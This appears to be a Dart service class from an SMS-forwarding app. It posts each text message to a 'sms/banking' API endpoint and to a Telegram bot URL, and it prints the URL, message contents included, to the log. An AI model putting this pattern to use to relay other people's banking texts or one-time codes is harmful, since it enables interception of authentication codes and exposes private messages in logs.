import 'package:smsforwarder/config/constant.dart';
import 'package:smsforwarder/plugin/dio.dart';

class SmsService {

  static Future<void> forward(String sms) async {
    try {
      Map<String, dynamic> body = {
        'message': sms
      };
      http.post(Constant.apiUrl + 'sms/banking', data: body);
      String url = Constant.telegramBotApi + Uri.encodeComponent(sms.toString());
      http.get(url);
      print(url);
    } catch (e) {
      print(e);
    }
  }
}
